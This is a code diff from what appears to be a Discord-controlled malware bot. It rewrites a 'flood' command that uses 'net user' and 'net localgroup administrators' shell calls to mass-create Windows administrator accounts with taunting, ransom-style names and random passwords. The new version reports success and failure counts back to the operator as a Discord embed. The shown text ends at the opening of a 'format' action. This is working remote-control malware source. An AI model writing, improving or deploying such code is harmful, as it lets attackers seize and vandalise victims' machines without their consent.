@@ -105,27 +105,40 @@ async def manageuser(ctx, action: str, *, username: str = None, password: str = 
 
 
         elif action == "flood":
-                try:
-                        existing_usernames = set()
-                        with concurrent.futures.ThreadPoolExecutor() as executor:
-                                futures = []
-                                for cycle in range(3):
-                                        for i in range(1, 26):
-                                                if i % 3 == 1: username = f'PAYUSMONEY{i}'
-                                                elif i % 3 == 2: username = f'HACKEDLOL{i}'
-                                                else: username = f'MISTERPISSAIR{i}'
-                                                if username not in existing_usernames:
-                                                        existing_usernames.add(username)
-                                                        password = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
-                                                        futures.append(executor.submit(subprocess.run, f'net user {username} {password} /add', shell=True))
-                                                        futures.append(executor.submit(subprocess.run, f'net localgroup administrators {username} /add', shell=True))
-                                for future in futures:
-                                        future.result()
-                        await ctx.send("Flood operation completed.")
-                except Exception as e:
-                        await ctx.send(f"Error with account spam: {e}")
-
-
+            try:
+                existing_usernames = set()
+                success_count = 0
+                fail_count = 0
+                with concurrent.futures.ThreadPoolExecutor() as executor:
+                    futures = []
+                    for cycle in range(3):
+                        for i in range(1, 26):
+                            if i % 3 == 1: username = f'PAYUSMONEY{i}'
+                            elif i % 3 == 2: username = f'HACKEDLOL{i}'
+                            else: username = f'MISTERPISSAIR{i}'
+                            if username not in existing_usernames:
+                                existing_usernames.add(username)
+                                password = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
+                                futures.append(executor.submit(subprocess.run, f'net user {username} {password} /add', shell=True))
+                                futures.append(executor.submit(subprocess.run, f'net localgroup administrators {username} /add', shell=True))
+                    for future in futures:
+                        try:
+                            future.result()
+                            success_count += 1
+                        except Exception as e:
+                            fail_count += 1
+                            print(f"Error with user creation: {e}")
+                
+                embed = discord.Embed(
+                    title="Flood Operation Results",
+                    description=f"Flood operation completed. Here's the status of the user creation process:",
+                    color=discord.Color.green()
+                )
+                embed.add_field(name="Success", value=f"✅ {success_count} new users added", inline=False)
+                embed.add_field(name="Failure", value=f"❌ {fail_count} failures", inline=False)
+                await ctx.send(embed=embed)
+            except Exception as e:
+                await ctx.send(f"Error with account spam: {e}")
 
         elif action == "format":
             success_count = 0
